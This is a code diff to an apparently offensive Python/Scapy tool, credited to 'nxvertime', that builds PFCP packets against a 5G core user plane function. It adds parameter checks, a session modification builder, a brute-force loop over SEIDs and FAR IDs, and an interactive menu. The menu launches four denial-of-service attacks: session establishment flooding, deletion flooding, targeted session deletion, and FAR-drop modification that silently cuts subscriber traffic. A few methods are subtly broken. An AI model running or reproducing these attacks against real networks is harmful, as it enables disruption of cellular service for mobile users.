@@ -41,6 +41,9 @@ class TColors:
 class Log:
     def __init__(self, prefix):
         self.prefix = prefix
+    
+    def set_prefix(self, prefix):
+        self.prefix = prefix
 
     def info(self, message):
         print(f"{TColors.BOLD}{TColors.BLUE}{self.prefix}{TColors.RESET} {message}")
@@ -56,9 +59,61 @@ class Log:
 
     
 
+# TODO: rename
 
+# TODO: Docstrings
+# TODO: Internal functions
+
+
+class HandleParams:
+    def __init__(self, classPrefix=""):
+        self.basePrefix = f"[HandleParams]{classPrefix}"
+        self.logger = Log(self.basePrefix)
+        self.default_error_messages = {
+            "src_addr": "No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').",
+            "dest_addr": "No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').",
+            "src_port": "No source port provided. Expected a valid port number (e.g., 8805).",
+            "dest_port": "No destination port provided. Expected a valid port number (e.g., 8805).",
+
+            "seid": "No SEID provided. Expected a valid SEID (e.g., 0xC0FFEE).",
+            
+            "evil_addr": "No evil address provided.",
+            "upf_addr": "No UPF address provided.",
+            "smf_addr": "No SMF address provided.",
+            "ue_addr": "No UE address provided.",
+            
+            "target_seid": "No SEID provided.",
+            "far_id": "No FAR ID provided.",
+            "update_ie": "No Update IE provided.",
+            "far_range": "No FAR ID range provided.",
+            "session_range": "No Session ID range provided.",
+
+        }
+    
+    def set_method_prefix(self, prefix):
+        self.logger.set_prefix(self.basePrefix + prefix)
+
+    def check_parameters(self, params_required: dict, method_prefix=""):
+        ret_val = True
+        self.set_method_prefix(method_prefix)
+        for param_name, param_value in params_required.items():
+            if param_value is None or not param_value :
+                error_message = self.default_error_messages.get(
+                    param_name, f"No {param_name} provided. Expected a valid value."
+                )
+                self.logger.error(f"Error: {error_message}")
+                ret_val = False
+
+        if not ret_val:
+            self.logger.error("Error: Invalid parameters provided.")
+
+        return ret_val
+
+
+
+ 
 class Ez_PFCP:
-    def __init__(self, src_addr, dest_addr, src_port=8805, dest_port=8805, verbose=False):
+    def __init__(self, src_addr=None, dest_addr=None, src_port=8805, dest_port=8805, verbose=False):
         self.src_addr = src_addr
         self.dest_addr = dest_addr
         self.src_port = src_port
@@ -67,14 +122,57 @@ class Ez_PFCP:
         self.verbose = verbose
         self.seid=None
         
-        self.logger = Log("[EZ-PFCP]")
+        self.classPrefix = "[EZ-PFCP]"
+        self.logger = Log(self.classPrefix)
+        
+        self.paramsHandler = HandleParams(self.classPrefix)
         
         
         if verbose:
             self.logger.info("Verbose mode enabled")
 
+    # Utility functions 
+    
+    def check_parameters(self, src_addr, dest_addr, src_port, dest_port, seid=None, require_seid=True):        
+        ret_val = True
         
+        self.paramsHandler.check_parameters({
+            "src_addr": src_addr,
+            "dest_addr": dest_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            "seid": 1 if not require_seid else seid,
+            
+        })
         
+        if src_addr is None:
+            self.logger.error("Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
+            ret_val = False
+        
+        if dest_addr is None:
+            self.logger.error("Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
+            ret_val = False
+            
+        if src_port is None:
+            self.logger.error("Error: No source port provided. Expected a valid port number (e.g., 8805).")
+            ret_val = False
+            
+        if dest_port is None:
+            self.logger.error("Error: No destination port provided. Expected a valid port number (e.g., 8805).")
+            ret_val = False
+        
+        if require_seid and seid is None:
+            self.logger.error("Error: No SEID provided. Expected a valid SEID (e.g., 0xC0FFEE).")
+            ret_val = False
+        
+        if ret_val == False:
+            self.logger.error("Error: Invalid parameters provided")
+        
+        return ret_val
+        
+            
+            
+    
         
     def new_seq(self, randomize=False):
         if randomize:
@@ -87,6 +185,8 @@ class Ez_PFCP:
         return seq
     
     
+    # FAR Operations
+
     def Random_create_far(self):
         return IE_CreateFAR(
             IE_list=[
@@ -100,12 +200,39 @@ class Ez_PFCP:
                 )
             ]
         )
+        
+    def Update_FAR(far_id, apply_action_ie=IE_ApplyAction(FORW=1)):
+
+        ie_update_far = IE_UpdateFAR(
+        IE_list=[
+            IE_FAR_Id(id=far_id),
+            apply_action_ie
+            ]
+        )
+        ie_update_far = Raw(bytes(ie_update_far))
+        return ie_update_far
+    
+    
+    # PFCP Message Building Functions
     
     def Build_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
+        
+        if not self.paramsHandler.check_parameters({
+            "src_addr": src_addr,
+            "dest_addr": dest_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            
+            
+        }, "[Build_PFCP_association_setup_req]"):
+            return 
+        
+
+        
         seq = self.new_seq()
         
         # Trick to bypass scapy's bad parsing
@@ -132,6 +259,19 @@ class Ez_PFCP:
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
         seid = seid or self.seid
+        
+        if not self.paramsHandler.check_parameters({
+            "src_addr": src_addr,
+            "dest_addr": dest_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            "seid": seid,
+            
+        }, "[Build_PFCP_session_establishment_req]"):
+            return 
+        
+
+        
         seq = self.new_seq(randomize=random_seq)
         
         
@@ -187,13 +327,19 @@ class Ez_PFCP:
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
         
-
-        if src_addr is None:
-            self.logger.error("No source address provided for PFCP session deletion request")
+        if not self.paramsHandler.check_parameters({
+            "src_addr": src_addr,
+            "dest_addr": dest_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            "seid": seid
             
+            
+        }, "[Build_PFCP_session_deletion_req]"):
+            return 
+        
+        if(not self.check_parameters(src_addr, dest_addr, src_port, dest_port, seid)):
             return
-        if self.verbose:
-            self.logger.info(f"Sending PFCP session deletion request to {dest_addr} with SEID {seid}")
             
         
 
@@ -211,6 +357,43 @@ class Ez_PFCP:
         packet = packet.__class__(bytes(packet))
         return packet
     
+    
+    def Build_PFCP_session_modification_req(self, seid, far_id, update_ie=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
+        src_addr = src_addr or self.src_addr
+        dest_addr = dest_addr or self.dest_addr
+        src_port = src_port or self.src_port
+        dest_port = dest_port or self.dest_port
+        seid = seid or self.seid
+        
+        if not self.paramsHandler.check_parameters({
+            "src_addr": src_addr,
+            "dest_addr": dest_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            "seid": seid,
+            "far_id": far_id,
+            "update_ie": update_ie 
+            
+        }, "[Build_PFCP_session_modification_req]"):
+            return 
+        
+        if(not self.check_parameters(src_addr, dest_addr, src_port, dest_port, seid)):
+            return
+        
+       
+        update_ie = update_ie or self.Update_FAR(far_id)
+        
+        
+        packet = PFCP(
+            version=1,
+            message_type=52,
+            S=1,
+            seid=seid,
+            seq=1
+        ) / update_ie
+        packet = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / packet
+        packet = packet.__class__(bytes(packet))
+        return packet
 
     
     
@@ -221,22 +404,19 @@ class Ez_PFCP:
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
+        
+        if not self.paramsHandler.check_parameters({
+            "src_addr": src_addr,
+            "dest_addr": dest_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+
+            
+        }, "[Send_PFCP_association_setup_req]"):
+            return
+        
         seq = self.new_seq()
         
-        if src_addr is None:
-            self.logger.error("Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
-            return
-        if src_port is None:
-            self.logger.error("Error: No source port provided. Expected a valid port number (e.g., 8805).")
-            return
-        if dest_addr is None:
-            self.logger.error("Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
-            return
-        if dest_port is None:
-            self.logger.error("Error: No destination port provided. Expected a valid port number (e.g., 8805).")
-            return
-
-
         
         pfcp_association_setup_req = self.Build_PFCP_association_setup_req(
             src_addr=src_addr,
@@ -258,23 +438,16 @@ class Ez_PFCP:
         seid = seid or self.seid
         seq = self.new_seq(randomize=random_seq)
         
-        
-        if src_addr is None:
-            self.logger.error("Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
-            return
-        if src_port is None:
-            self.logger.error("Error: No source port provided. Expected a valid port number (e.g., 8805).")
-            return
-        if dest_addr is None:
-            self.logger.error("Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
-            return
-        if dest_port is None:
-            self.logger.error("Error: No destination port provided. Expected a valid port number (e.g., 8805).")
-            return
-        if ue_addr is None:
-            self.logger.error("Error: No UE address provided. Expected a valid IPv4 address (e.g., '10.0.0.1').")
-            return
 
+        if not self.paramsHandler.check_parameters({
+            "src_addr": src_addr,
+            "dest_addr": dest_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            "seid": seid,
+            "ue_addr": ue_addr,
+        }, "[Send_PFCP_session_establishment_req]"):
+            return
         
         if self.verbose:
             self.logger.info(f"Sending PFCP session establishment request to {dest_addr} with SEID {seid}, UE address {ue_addr}, TEID {teid}, precedence {precedence}, interface {interface}")
@@ -306,22 +479,18 @@ class Ez_PFCP:
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
+        
+        if not self.paramsHandler.check_parameters({
+            "src_addr": src_addr,
+            "dest_addr": dest_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            "seid": seid
+            
+        }, "[Send_PFCP_session_deletion_req]"):
+            return
+        
         seq=self.new_seq()
-        if seid is None:
-            self.logger.error("Error: No SEID provided. Expected a valid SEID (e.g., 0xC0FFEE).")
-            return
-        if src_addr is None:
-            self.logger.error("Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
-            return
-        if src_port is None:
-            self.logger.error("Error: No source port provided. Expected a valid port number (e.g., 8805).")
-            return
-        if dest_addr is None:
-            self.logger.error("Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
-            return
-        if dest_port is None:
-            self.logger.error("Error: No destination port provided. Expected a valid port number (e.g., 8805).")
-            return
 
         req = self.Build_PFCP_session_deletion_req(
                 seid=seid,
@@ -391,9 +560,19 @@ class PFCPDosAttack:
         self.valid_seid_list = list()
         self.log_prefix = f"{TColors.BOLD + TColors.GREEN}[DoS] {TColors.RESET}"
         
-        self.logger = Log("[DoS]")
+        self.classPrefix = "[DoS]"
+        self.logger = Log(self.classPrefix)
+        self.evil_addr, self.upf_addr, self.src_port, self.dest_port
+        self.paramsHandler = HandleParams(self.classPrefix)
+        
+        
+        
+        
+    
+
         
     def set_random_far_number(self, random_far_number=15):
+        
         self.random_far_number = random_far_number
         if not self.verbose : return
         if random_far_number:
@@ -653,32 +832,17 @@ class PFCPDosAttack:
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
         
-        if upf_addr is None:
-            self.logger.error("No UPF address provided for PFCP session deletion")
+        if not self.paramsHandler.check_parameters({
+            "upf_addr": upf_addr,
+            "smf_addr": smf_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            "target_seid": target_seid
             
-            return
-        if smf_addr == None:
-            self.logger.error("No SMF address provided for PFCP session deletion")
-            
-            return
-        
-        if src_port is None:
-            self.logger.error("No source port provided for PFCP session deletion")
-            
-            return
-        if dest_port is None:
-            self.logger.error("No destination port provided for PFCP session deletion")
-            
-            return
-        
-            
-        if not target_seid:
-            self.logger.error("No SEID provided for PFCP session deletion")
-            
+        }, "[Start_pfcp_session_deletion_targeted]"):
             return
 
-        
-        
+
         if self.verbose:
             self.logger.info(f"Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}")
             
@@ -693,6 +857,33 @@ class PFCPDosAttack:
         
         if self.verbose:
             self.logger.success(f"PFCP session deletion packet sent to {upf_addr} with SEID {target_seid}")
+    
+    def Start_pfcp_session_modification_far_drop_bruteforce(self, far_range, session_range, evil_addr=None, upf_addr=None, src_port=None, dest_port=None):
+        if not self.paramsHandler.check_parameters({
+            "far_range": far_range,
+            "session_range": session_range,
+            "evil_addr": evil_addr,
+            "upf_addr": upf_addr,
+            "src_port": src_port,
+            "dest_port": dest_port
+        }, "[Start_pfcp_session_modification_far_drop_bruteforce]"):
+            return
+        
+        
+        ez_pfcp_obj= Ez_PFCP(src_addr=EVIL_ADDR, dest_addr=UPF_ADDR, src_port=SRC_PORT, dest_port=DEST_PORT)
+        for seid in range(1, session_range):
+            
+            for farId in range(1, far_range):
+                packet = ez_pfcp_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId)
+                res = sr1(packet)
+                pfcp_cause = None
+                for ie in res[PFCP].IE_list:
+                    if isinstance(ie, IE_Cause):
+                        pfcp_cause = ie.cause
+                        break
+                
+                if pfcp_cause == 1:
+                    self.logger.success(f"PFCP Session Modification Request accepted, SEID: {hex(seid)}, FAR_ID: {hex(farId)}")
             
         
 
@@ -735,46 +926,108 @@ class PFCPDosAttack:
 # objet_dos.set_verbose(True)
 # objet_dos.Start_pfcp_session_deletion_bruteforce(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
 
-def Update_FAR_DROP(far_id):
 
-    ie_update_far = IE_UpdateFAR(
-    IE_list=[
-        IE_FAR_Id(id=far_id),
-        IE_ApplyAction(DROP=1)
-        ]
-    )
-    ie_update_far = Raw(bytes(ie_update_far))
-    return ie_update_far
-
-
-def Build_PFCP_session_modification_req(seid, far_id, src_addr, dest_addr, src_port, dest_port):
+def main():
     
-    packet = PFCP(
-        version=1,
-        message_type=52,
-        S=1,
-        seid=seid,
-        seq=1
-    ) / Update_FAR_DROP(far_id)
-    packet = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / packet
-    packet = packet.__class__(bytes(packet))
-    return packet
-
-
-def Start_pfcp_session_modification_far_drop_bruteforce():
-    for seid in range(1, 100):
+    print("Ez_PFCP and PFCPDosAttack demo script")
+    print("Coded with <3 by nxvertime")
+    print("---------------------------------------\n")
+    
+    print("Choose an attack : ")
+    print("[1]  PFCP Session Establishment Flood")
+    print("[2]  PFCP Session Deletion Flood")
+    print("[3]  PFCP Session Deletion Targeted")
+    print("[4]  PFCP Session Modification FAR Drop")
+    
+    usr_input = input("# ")
+    choice = None
+    try:
+        choice = int(usr_input)
+    except ValueError:
+        print("Invalid input. Please enter a number.")
+        return
+    
+    if choice == 1:
+        print("PFCP Session Establishment Flood selected")
         
-        for farId in range(1, 100):
-            packet = Build_PFCP_session_modification_req(seid=seid, far_id=farId, src_addr=EVIL_ADDR, dest_addr=UPF_ADDR, src_port=SRC_PORT, dest_port=DEST_PORT)
-            res = sr1(packet)
-            pfcp_cause = None
-            for ie in res[PFCP].IE_list:
-                if isinstance(ie, IE_Cause):
-                    pfcp_cause = ie.cause
-                    break
-            
-            if pfcp_cause == 1:
-                print(f"PFCP session modification request accepted; SEID: {hex(seid)}, FAR_ID: {hex(farId)}")
-    
+        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
+        evil_addr = input("# ") or EVIL_ADDR
+        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
+        upf_addr = input("# ") or UPF_ADDR
+        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
+        src_port = int(input("# ") or SRC_PORT)
+        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
+        dest_port = int(input("# ") or DEST_PORT)
+        
+        print("Number of requests: ")
+        reqNbr = int(input("# "))
+        print("Number of threads: ")
+        num_threads = int(input("# "))
+        print("Random FAR number (0 to disable): ")
+        random_far_number = int(input("# "))
+        
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port)
+        dos_obj.set_random_far_number(random_far_number)
+        dos_obj.Start_pfcp_session_establishment_flood(reqNbr=reqNbr, num_threads=num_threads)
+        
+    if choice == 2:
+        print("PFCP Session Deletion Flood selected")
+        
+        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
+        evil_addr = input("# ") or EVIL_ADDR
+        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
+        upf_addr = input("# ") or UPF_ADDR
+        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
+        src_port = int(input("# ") or SRC_PORT)
+        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
+        dest_port = int(input("# ") or DEST_PORT)
+        
+        print("Number of requests: ")
+        reqNbr = int(input("# "))
+        print("Number of threads: ")
+        num_threads = int(input("# "))
+        
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port)
+        dos_obj.Start_pfcp_session_deletion_bruteforce(reqNbr=reqNbr, num_threads=num_threads)
 
-Start_pfcp_session_modification_far_drop_bruteforce()
+    if choice == 3:
+        print("PFCP Session Deletion Targeted selected")
+        
+        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
+        evil_addr = input("# ") or EVIL_ADDR
+        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
+        upf_addr = input("# ") or UPF_ADDR
+        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
+        src_port = int(input("# ") or SRC_PORT)
+        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
+        dest_port = int(input("# ") or DEST_PORT)
+        
+        print("SEID to delete (in hex): ")
+        target_seid = int(input("# "), 0)
+        
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port)
+        dos_obj.Start_pfcp_session_deletion_targeted(target_seid=target_seid, smf_addr=evil_addr)
+    
+    if choice == 4:
+        print("PFCP Session Modification FAR Drop selected")
+        
+        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
+        evil_addr = input("# ") or EVIL_ADDR
+        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
+        upf_addr = input("# ") or UPF_ADDR
+        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
+        src_port = int(input("# ") or SRC_PORT)
+        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
+        dest_port = int(input("# ") or DEST_PORT)
+        
+        print("Enter the FAR range: ")
+        far_range = int(input("# "))
+        print("Enter the Session range: ")
+        session_range = int(input("# "))
+        
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port)
+        dos_obj.Start_pfcp_session_modification_far_drop_bruteforce(far_range=far_range, session_range=session_range)
+
+
+if __name__ == "__main__":
+    main()
